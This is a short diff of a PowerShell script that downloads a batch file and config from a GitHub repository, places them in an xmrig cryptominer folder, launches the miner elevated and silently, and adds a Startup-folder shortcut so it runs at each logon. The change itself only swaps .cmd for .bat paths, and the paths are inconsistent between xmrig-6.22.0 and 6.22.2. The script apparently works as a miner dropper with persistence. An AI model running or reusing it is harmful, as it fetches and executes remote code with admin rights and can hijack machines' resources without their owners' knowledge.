@@ -9,9 +9,9 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/head
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json
 Copy-Item -Path C:\XRPRUN.bat -Destination C:\xmrig-6.22.2\XRPRUN.bat -Force
 Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
-Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.cmd' -ArgumentList '/S' -Verb RunAs
-$source = "C:\xmrig-6.22.0\XRPRUN.cmd"
-$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRPRUN.cmd.lnk"
+Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.bat' -ArgumentList '/S' -Verb RunAs
+$source = "C:\xmrig-6.22.0\XRPRUN.bat"
+$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRPRUN.bat.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
